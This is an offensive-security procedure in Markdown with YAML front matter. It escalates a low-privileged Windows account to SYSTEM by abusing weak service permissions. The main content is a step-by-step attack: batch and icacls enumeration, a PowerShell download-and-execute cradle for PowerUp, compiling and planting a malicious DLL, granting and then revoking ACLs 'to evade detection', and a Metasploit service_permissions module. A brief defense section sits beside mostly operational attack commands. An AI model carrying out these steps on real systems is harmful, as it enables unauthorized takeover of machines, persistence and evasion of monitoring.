---
id: 204776d5-293a-4009-8740-bbd076099788
name: Windows-Local-Service-Permissions-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.450155+00:00'
updated_at: '2023-04-10T20:37:36.965006+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Modify Existing Service|T1031 - Modify Existing Service]]'
  - >-
    [[techniques/Service Registry Permissions Weakness|T1058 - Service Registry
    Permissions Weakness]]
sub_techniques: []
tags:
  - '[[tags/EoP - Incorrect permissions in services]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/icacls-check-permissions]]'
  - '[[commands/gcc-compile-malicious-dll-x64]]'
  - '[[commands/gcc-compile-malicious-dll-x86]]'
  - '[[commands/cacls-display-acls]]'
  - '[[commands/powerup-find-dll-hijack]]'
  - '[[commands/cacls-grant-permission]]'
  - '[[commands/cacls-revoke-permission]]'
  - '[[commands/enumerate-service-paths-batch]]'
  - '[[commands/msfconsole-service-permissions-exploit]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-Local-Service-Permissions-Escalation

## Summary

This procedure exploits weak permissions on Windows local services to escalate privileges from a low-privileged user account to SYSTEM level. It covers identifying vulnerable services via permission checks and path enumeration, DLL hijacking by placing malicious DLLs in unmonitored directories, and direct permission modifications using tools like icacls and cacls. Commonly used in post-exploitation to gain persistent elevated access.

## Description

In Windows environments, services often run with elevated privileges (e.g., LocalSystem) but may have registry keys, binaries, or dependent DLL paths with overly permissive ACLs allowing low-privileged users to write files or modify configurations. Attackers can abuse this by replacing service binaries with malicious ones, hijacking DLL loads, or altering permissions to execute code as SYSTEM. This technique targets misconfigurations in service registry hives (HKLM\SYSTEM\CurrentControlSet\Services) and file system paths. It requires initial foothold access and is effective against unpatched or poorly hardened Windows systems (e.g., Windows 10/11, Server 2019+). Success grants full system control, enabling persistence, lateral movement, or data exfiltration.

## Requirements

1. Low-privileged user account (e.g., standard user) on the target Windows machine.
2. Access to Command Prompt or PowerShell on the target.
3. Tools like PowerUp.ps1 (from PowerSploit), Process Monitor (ProcMon), and a cross-compiler (e.g., MinGW-w64 on Kali Linux) for DLL creation.
4. Network access if compiling off-target (e.g., via SMB share).

## Defense

- Regularly audit service permissions using tools like AccessChk or PowerUp in blue team mode.
- Apply principle of least privilege: Ensure service binaries and registry keys are writable only by Administrators or SYSTEM.
- Enable Windows Defender Application Control (WDAC) or AppLocker to restrict unsigned binaries/DLLs.
- Monitor for anomalous service modifications via Event ID 7045 (new service) or 4697 (service install) in Windows Security logs.
- Use Sysmon for file creation in service directories and registry changes.

## Objectives

1. Identify services with weak file/registry permissions allowing write access.
2. Escalate to SYSTEM privileges via DLL hijacking or permission abuse.
3. Establish persistence through modified services.

## Instructions

### Step 1: Enumerate Services and Check Permissions

**Context**: Identify services running as SYSTEM with writable binary paths or registry permissions. This reveals potential hijack points by dumping service details and auditing ACLs.

**Command** ([[commands/enumerate-service-paths-batch]]):

```batch
for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt && for /f eol=^" delims=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt && FOR /F %i in (Servicenames.txt) DO echo %i && type Servicenames.txt && FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt && FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

> This batch script extracts non-system32 service paths, checks their ACLs with icacls, and lists binary paths. Look for paths where 'Users' or current user has (F) full control or (M) modify rights. Clean up temp files afterward to avoid detection.

**Command** ([[commands/icacls-check-permissions]]):

```cmd
icacls "C:\Program Files\ServiceBinaryPath"
```

> Run icacls on identified paths to view detailed ACLs. Success if output shows BUILTIN\Users:(F) or similar weak permissions.

### Step 2: Identify DLL Hijack Opportunities

**Context**: Use PowerSploit's PowerUp module to find DLL hijacking paths in service environments and confirm with ProcMon. This pinpoints missing DLLs that services attempt to load.

**Command** ([[commands/powerup-find-dll-hijack]]):

```powershell
Invoke-DllHijack -ScriptBlock { Write-Output 'Missing DLL paths identified' }
```

> Download and run PowerUp.ps1 on target (e.g., via IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')). Execute Find-PathDLLHijack to list potential hijacks. Simultaneously run ProcMon on target, filter for 'Name not found' events during service startup to confirm.

> Expected: Output like 'C:\ProgramData\VulnerableService\missing.dll : Writable path'. Verify with ProcMon logs showing failed loads.

### Step 3: Compile and Deploy Malicious DLL

**Context**: Create a malicious DLL that executes payload on load (e.g., spawn reverse shell or drop file). Compile off-target if needed, then place in hijack path.

**Command** ([[commands/gcc-compile-malicious-dll-x64]]):

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o malicious.dll
```

> On Kali/attacker machine, compile for x64. Use the [[codes/Malicious-DLL-for-Service-Hijack]] code as source.

**Command** ([[commands/gcc-compile-malicious-dll-x86]]):

```bash
i686-w64-mingw32-gcc windows_dll.c -shared -o malicious.dll
```

> For x86 targets. Transfer DLL to target via SMB or existing access, place in identified hijack directory (e.g., copy malicious.dll "C:\ProgramData\VulnerableService\missing.dll").

> Expected: DLL compiles without errors. On target, service restart loads it, executing DllMain payload.

### Step 4: Modify Permissions if Needed (Alternative to Hijack)

**Context**: If direct write access is blocked, grant temporary permissions to service paths, modify binary/config, then revoke to evade detection.

**Command** ([[commands/cacls-grant-permission]]):

```cmd
cacls "C:\Service\binary.exe" /E /G %USERNAME%:F
```

> Grant full control to current user. Replace binary with malicious executable or edit config.

**Command** ([[commands/cacls-revoke-permission]]):

```cmd
cacls "C:\Service\binary.exe" /E /R %USERNAME%
```

> Revoke after modification. Trigger service restart via sc start <service>.

**Command** ([[commands/cacls-display-acls]]):

```cmd
cacls "C:\Service\binary.exe"
```

> Verify changes pre/post. Look for updated ACLs showing granted/revoked access.

### Step 5: Exploit with Metasploit (Automated Alternative)

**Context**: Use Metasploit's service_permissions module for automated enumeration and exploitation if manual steps fail.

**Command** ([[commands/msfconsole-service-permissions-exploit]]):

```msfconsole
use exploit/windows/local/service_permissions
set SESSION 1
exploit
```

> From Meterpreter session on target. Module scans for weak service perms and executes payload as SYSTEM.

> Expected: Session upgrades to SYSTEM privileges.
